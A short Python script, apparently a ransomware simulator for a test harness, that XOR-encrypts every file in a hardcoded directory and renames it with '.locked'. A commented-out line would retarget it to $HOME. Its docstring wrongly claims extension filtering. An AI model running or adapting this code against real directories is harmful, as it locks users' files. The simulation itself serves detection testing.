#!/usr/bin/env python3

"""
Usage:
    export TARGET_DIR=/path/to/targets   # or use create_files.py's output
    python3 ransomware_sim.py
"""

import os
import sys

# Real-world ransomware commonly resolves its target(s) from
# environment variables rather than hardcoding paths, so it can adapt
# to whatever machine it lands on. There's an option to do that here (It's commented): check a
# dedicated test variable first, then fall back to $HOME the way an
# actual sample targeting user documents might.
TARGET_DIR =  "/home/jevaun/harness_dir"     #os.environ.get("TARGET_DIR") or os.environ.get("HOME")

LOCKED_SUFFIX = ".locked"
XOR_KEY = 0xAA


def discover_files(directory):
    """Walk the target directory and return files worth encrypting.

    Real ransomware typically filters by extension (docs, images,
    archives) and skips its own already-encrypted output -- we do the
    same here rather than blindly grabbing every file.
    """
    targets = []
    for root, _dirs, files in os.walk(directory):
        for name in files:
            if name.endswith(LOCKED_SUFFIX):
                continue
            targets.append(os.path.join(root, name))
    return targets


def encrypt_file(path):
    with open(path, "r+b") as f:
        data = f.read()
        f.seek(0)
        f.write(bytes(b ^ XOR_KEY for b in data))
    os.rename(path, path + LOCKED_SUFFIX)


def main():
    if not TARGET_DIR or not os.path.isdir(TARGET_DIR):
        print(
            "[ransomware_sim] No valid target directory found. Set "
            "TARGET_DIR to a directory created by "
            "setup_targets.py before running this.",
            file=sys.stderr,
        )
        sys.exit(1)

    files = discover_files(TARGET_DIR)
    print(f"[ransomware_sim.py] discovered {len(files)} candidate files in "
          f"{TARGET_DIR}. Encrypting them now! ", file=sys.stderr)

    for path in files:
        try:
            encrypt_file(path)
        except OSError as e:
            print(f"[ransomware_sim] skipped {path}: {e}", file=sys.stderr)

    print("[ransomware_simulation] done!", file=sys.stderr)


if __name__ == "__main__":
    main()
